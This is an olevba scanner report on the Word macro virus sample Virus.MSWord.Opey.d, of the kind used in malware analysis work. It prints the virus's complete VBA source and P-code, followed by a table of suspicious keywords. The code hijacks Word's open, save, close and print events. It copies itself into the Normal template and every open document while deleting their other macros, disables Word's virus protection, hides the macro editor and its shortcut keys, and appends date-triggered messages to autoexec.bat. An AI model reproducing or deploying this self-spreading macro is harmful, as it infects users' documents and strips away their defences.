olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO A_OPEY_03.bas 
in file: Virus.MSWord.Opey.d - OLE stream: 'Macros/VBA/A_OPEY_03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub greetings()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
            If ((Month(Date) = 12) And (Day(Date) = 25)) Or ((Month(Date) = 1) And (Day(Date) = 1)) Then
                line1$ = "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
            End If
            If (Month(Date) = 11) And (Day(Date) = 1) Then
                line1$ = "echo HAPPY HALLOWEEN !!!"
            End If
            If (Month(Date) = 2) And (Day(Date) = 14) Then
                line1$ = "echo HAPPY VALENTINES DAY !!!"
            End If
                If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, "echo from: OPEY A."
                        Print #hFile, "pause"
                    Close hFile
                End If
End Sub
Sub OnlyYou()
  On Error Resume Next
    Call A_OPEY_03
    NTInfected = False
    d = NormalTemplate.FullName
    s = ActiveDocument.FullName
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "A_OPEY_03" Then NTInfected = True
                If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "A_OPEY_03" Then ODInfected = True
                    If (clan <> "A_OPEY_03") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=s, Destination:=d, Name:="A_OPEY_03", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
End Sub
Sub A_OPEY_03()
    On Error Resume Next
    Application.UserName = "OPEY A."
    Application.UserAddress = "CNNHS B'92 PHILIPPINES (CNSC)"
    Application.UserInitials = "LOVE"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "OPEY A."
        .Title = "LOVE"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub FileSave()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Call OnlyYou
    Documents.Add Template:=NormalTemplate.FullName, NewTemplate:=False
    newfile$ = 1
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call OnlyYou
End Sub
Sub AutoExec()
    On Error Resume Next
    Call OnlyYou
End Sub
Sub Filesaveas()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub ToolsCustomize()
    On Error Resume Next
    Call OnlyYou
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub Fileopen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call OnlyYou
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/A_OPEY_03 - 7406 bytes
' Line #0:
' 	FuncDefn (Sub greetings())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	St autoexecfile$ 
' Line #3:
' 	Ld Friend 
' 	St hFile 
' Line #4:
' 	LitStr 0x0000 ""
' 	St line1$ 
' Line #5:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #6:
' 	LitStr 0x002E "echo MERRY CHRISTMASS AND A HAPPY NEW YEAR !!!"
' 	St line1$ 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #9:
' 	LitStr 0x0018 "echo HAPPY HALLOWEEN !!!"
' 	St line1$ 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #12:
' 	LitStr 0x001D "echo HAPPY VALENTINES DAY !!!"
' 	St line1$ 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Ld line1$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #15:
' 	Ld autoexecfile$ 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #16:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #17:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line1$ 
' 	PrintItemNL 
' Line #18:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "echo from: OPEY A."
' 	PrintItemNL 
' Line #19:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #20:
' 	Ld hFile 
' 	Close 0x0001 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub OnlyYou())
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' 	ArgsCall (Call) A_OPEY_03 0x0000 
' Line #26:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #27:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St d 
' Line #28:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St s 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #30:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #31:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTInfected 
' 	EndIf 
' Line #32:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #35:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #36:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #37:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #38:
' 	Ld j 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #39:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ODInfected 
' 	EndIf 
' Line #40:
' 	Ld clan 
' 	LitStr 0x0009 "A_OPEY_03"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #41:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	Ld ODInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #43:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "A_OPEY_03"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #44:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld opendoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	EndWith 
' Line #47:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld s 
' 	ParamNamed Source 
' 	Ld d 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "A_OPEY_03"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #50:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	ArgsCall (Call) greetings 0x0000 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub A_OPEY_03())
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	LitStr 0x0007 "OPEY A."
' 	Ld Application 
' 	MemSt UserName 
' Line #57:
' 	LitStr 0x001D "CNNHS B'92 PHILIPPINES (CNSC)"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #58:
' 	LitStr 0x0004 "LOVE"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #59:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #60:
' 	LitStr 0x0007 "OPEY A."
' 	MemStWith Author 
' Line #61:
' 	LitStr 0x0004 "LOVE"
' 	MemStWith Title 
' Line #62:
' 	ArgsMemCallWith Execute 0x0000 
' Line #63:
' 	EndWith 
' Line #64:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #66:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #67:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #68:
' 	EndWith 
' Line #69:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #70:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #71:
' 	EndWith 
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #74:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #75:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #76:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #77:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #78:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #79:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #80:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub FileSave())
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #85:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub FileClose())
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #90:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #91:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub FileExit())
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #96:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #97:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub FileNew())
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #102:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Template 
' 	LitVarSpecial (False)
' 	ParamNamed NewTemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #103:
' 	LitDI2 0x0001 
' 	St newfile$ 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub AutoOpen())
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Sub AutoExec())
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Sub Filesaveas())
' Line #114:
' 	OnError (Resume Next) 
' Line #115:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #116:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #117:
' 	EndSub 
' Line #118:
' 	FuncDefn (Sub ToolsCustomize())
' Line #119:
' 	OnError (Resume Next) 
' Line #120:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Sub FilePageSetup())
' Line #123:
' 	OnError (Resume Next) 
' Line #124:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #125:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #126:
' 	EndSub 
' Line #127:
' 	FuncDefn (Sub FilePrint())
' Line #128:
' 	OnError (Resume Next) 
' Line #129:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #130:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #131:
' 	EndSub 
' Line #132:
' 	FuncDefn (Sub Fileopen())
' Line #133:
' 	OnError (Resume Next) 
' Line #134:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #135:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #136:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

